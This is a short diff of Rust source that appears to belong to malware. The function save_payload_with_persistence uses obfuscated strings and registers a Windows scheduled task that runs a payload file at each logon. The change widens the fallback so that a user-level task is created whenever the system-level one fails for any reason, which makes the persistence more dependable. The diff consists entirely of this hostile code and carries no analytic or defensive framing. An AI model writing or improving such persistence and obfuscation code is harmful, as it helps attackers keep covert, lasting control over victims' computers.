@@ -404,26 +404,21 @@ unsafe fn save_payload_with_persistence() -> Result<(), String> {
     match cmd.output() {
         Ok(output) => {
             if !output.status.success() {
-                let stderr = String::from_utf8_lossy(&output.stderr);
-                if stderr.contains("ERROR: Access is denied.") {
-                    // Fallback to user-level task
-                    let user_command = format!(
-                        "schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /f",
-                        task_name,
-                        full_file_path_win
-                    );
-                    let mut user_cmd = Command::new(obfuscate_string!("cmd"));
-                    user_cmd.args(&["/C", &user_command]);
-                    match user_cmd.output() {
-                        Ok(user_output) => {
-                             if !user_output.status.success() {
-                                return Err(format!("{}{}", obfuscate_string!("Failed to create user-level scheduled task: "), String::from_utf8_lossy(&user_output.stderr)));
-                            }
-                        },
-                        Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to execute user-level schtasks: "), e)),
-                    }
-                } else {
-                     return Err(format!("{}{}", obfuscate_string!("Failed to create scheduled task: "), stderr));
+                // Fallback to user-level task if system-level fails for any reason
+                let user_command = format!(
+                    "schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /f",
+                    task_name,
+                    full_file_path_win
+                );
+                let mut user_cmd = Command::new(obfuscate_string!("cmd"));
+                user_cmd.args(&["/C", &user_command]);
+                match user_cmd.output() {
+                    Ok(user_output) => {
+                        if !user_output.status.success() {
+                            return Err(format!("{}{}", obfuscate_string!("Failed to create user-level scheduled task: "), String::from_utf8_lossy(&user_output.stderr)));
+                        }
+                    },
+                    Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to execute user-level schtasks: "), e)),
                 }
             }
         },
